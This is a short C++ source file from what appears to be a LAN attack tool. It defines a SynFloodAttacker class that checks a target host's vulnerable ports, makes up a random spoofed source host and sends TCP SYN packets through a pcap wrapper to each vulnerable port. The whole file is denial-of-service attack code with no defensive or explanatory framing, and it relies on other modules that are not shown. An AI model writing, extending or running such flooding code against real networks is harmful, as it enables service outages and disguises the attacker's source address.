#include "synfloodattacker.h"
#include <QDebug>
#include "LANAttacker/lanpcap.h"
#include <QTime>
#include <windows.h>
#include <utility.h>







QString SynFloodAttacker::GetSynFloodInfo(QString HostName)
{
    QString IndexStr=HostName.split(".")[3];
    LANHostInfo Info=GetLANPCap()->GetHostInfo(IndexStr.toInt());
    return Info.GetOpenPortsInfo();
}

void SynFloodAttacker::AttackBehaveImpl(const LANHostInfo &TargetHost)
{
    if(!TargetHost.bIsHostVulerable)return ;


    LANHostInfo SrcHost=LANHostInfo::CreateRandomHost();
    for(int i=0;i<CheckVulerablePortsSize;++i)
    {
        //if it is vulerable port we send packet to its vulerable port
        if(TargetHost.bPortVulerable[i])
        {
           GetLANPCap()->SendTcpSynPacket(SrcHost,TargetHost,(qrand()%65534)+1,CheckVulerablePorts[i]);


        }
    }
}





